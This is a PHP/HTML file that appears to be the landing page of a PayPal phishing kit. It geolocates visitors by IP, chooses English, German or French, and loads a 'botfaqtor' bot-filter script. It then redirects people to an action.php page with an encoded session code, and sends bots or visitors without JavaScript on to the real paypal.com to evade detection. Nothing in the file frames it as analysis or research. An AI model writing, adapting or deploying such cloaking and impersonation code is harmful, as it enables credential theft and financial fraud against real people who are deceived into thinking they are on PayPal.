<?php
function file_get_contents_curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$details = json_decode(file_get_contents_curl("http://www.geoplugin.net/json.gp?ip=$ip"));
$country = $details->geoplugin_countryCode ?? '';
$browser_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '', 0, 2);

$sessionCode = 'EN';
if ($country === 'DE' && $browser_lang === 'de') {
    $sessionCode = 'DE';
} elseif ($country === 'FR' && $browser_lang === 'fr') {
    $sessionCode = 'FR';
} elseif ($browser_lang === 'de') {
    $sessionCode = 'DE';
} elseif ($browser_lang === 'fr') {
    $sessionCode = 'FR';
}

$loginRedirect = 'action.php?session=' . base64_encode($sessionCode);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal</title>
    <script>
        window.addEventListener('load', function () {
            fetch('botfaqtor/index.js', {cache: 'no-store'})
                .then(function (response) {
                    if (response.ok) {
                        return response.text();
                    }
                    throw new Error('Failed to load botfaqtor script.');
                })
                .then(function (scriptContent) {
                    var script = document.createElement('script');
                    script.type = 'text/javascript';
                    script.text = scriptContent;
                    document.head.appendChild(script);
                    window.location.href = <?php echo json_encode($loginRedirect); ?>;
                })
                .catch(function () {
                    window.location.href = 'https://www.paypal.com';
                });
        });
    </script>
</head>
<body>
    <noscript>
        <meta http-equiv="refresh" content="0;url=https://www.paypal.com">
    </noscript>
</body>
</html>
